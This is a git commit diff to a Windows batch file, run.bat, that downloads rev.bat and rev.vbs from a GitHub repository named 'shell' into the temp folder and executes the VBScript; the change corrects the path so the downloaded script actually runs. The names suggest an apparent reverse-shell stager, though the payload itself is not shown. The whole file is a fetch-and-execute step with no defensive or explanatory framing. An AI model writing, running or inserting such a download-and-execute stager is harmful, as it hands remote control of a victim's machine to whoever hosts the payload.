9c80009bba2d77d9520c489b8e2285a7de636c42
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 05:31:29 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -2,5 +2,5 @@
 set "temp_dir=%temp%"
 curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%temp_dir%\rev.bat"
 curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%temp_dir%\rev.vbs"
-call rev.vbs
+call %temp_dir%\rev.vbs
 exit
